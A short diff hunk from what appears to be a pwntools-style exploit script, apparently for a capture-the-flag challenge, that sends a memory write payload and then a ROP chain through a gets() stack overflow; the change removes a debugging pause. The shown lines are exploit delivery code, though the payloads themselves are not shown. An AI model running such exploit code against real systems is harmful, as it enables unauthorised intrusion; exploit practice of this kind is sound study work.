@@ -1453,7 +1453,7 @@ ss("write payload to {}, length {}".format(
 sd(p64(write_dest))
 sd(p64(len(write_payload)))
 sd(write_payload)
-input()
+
 # trigger gets(stack), send rop gadget
 sleep(0.1)
 sl(rop_payload)
